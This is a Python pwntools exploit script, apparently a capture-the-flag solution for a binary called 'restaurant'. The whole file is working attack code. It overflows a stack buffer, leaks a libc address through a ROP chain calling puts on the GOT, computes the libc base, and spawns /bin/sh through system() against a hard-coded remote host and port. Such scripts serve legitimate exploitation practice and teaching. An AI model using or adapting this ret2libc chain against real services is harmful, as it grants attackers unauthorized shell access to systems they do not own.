import sys
from pwn import *
import subprocess

RHOST = '159.65.89.136'
RPORT = 30349
EXE = "./restaurant"
LIBC_PATH = './libc.so.6'

context.log_level = 'INFO'
context.arch = 'amd64'

gdbscript = ''
commands = [
    'break *main',
    'break *fill+136',
    'break *fill+162'
]
for s in commands:
    gdbscript += s + "\n"

elf = context.binary = ELF(EXE, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

if len(sys.argv) != 2:
    sys.exit('[!] Please specify mode')

if sys.argv[1] == 'remote':
    io = remote(RHOST, RPORT)
elif sys.argv[1] == 'gdb': 
    io = gdb.debug([EXE], gdbscript=gdbscript)
elif sys.argv[1] == 'normal':
    io = process([EXE])
else:
    sys.exit('[!] Mode should be GDB, NORMAL or REMOTE')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io.sendlineafter(b'> ', b'1')

offset = 40

rop = ROP(elf)
rop.raw(b'A'*offset)
rop.call(elf.plt['puts'], [next(elf.search(b''))])
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(rop.find_gadget(['ret'])[0])
rop.call(elf.symbols['fill'])
io.sendlineafter(b'> ', rop.chain())
io.recvuntil('\n')
io.recvuntil('\n')
libc_puts = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
info('Libc puts address: {}'.format(hex(libc_puts)))

libc.address = libc_puts - libc.symbols['puts']
info('Libc address: {}'.format(hex(libc.address)))

rop = ROP(libc)
rop.raw(b'A'*offset)
rop.call(rop.find_gadget(['ret'])[0])
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
io.sendlineafter(b'> ', rop.chain())

io.interactive()
